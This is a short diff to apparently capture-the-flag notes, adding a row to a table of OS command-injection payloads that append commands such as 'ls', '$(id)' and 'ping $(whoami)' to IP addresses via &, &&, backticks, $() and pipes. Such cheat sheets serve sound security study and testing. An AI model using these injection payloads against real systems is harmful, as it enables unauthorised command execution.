@@ -14,7 +14,7 @@ icat -o 360448 disk.flag.img 1234
 |&| 1.1.1.1 & ls|
 |&&| 1.1.1.1 && ls|
 |``| (masih gacha) 8.8.8.8`ls` |
-|$|(masih gacha) 8.8.8.8$(id)|
+|$|(masih gacha) 8.8.8.8$(id) OR ping $(whoami)|
 | (double pipe) | 1.1.1.1 (double pipe) ls |
 | (single pipe) | 1.1.1.1 (single pipe) ls |
 
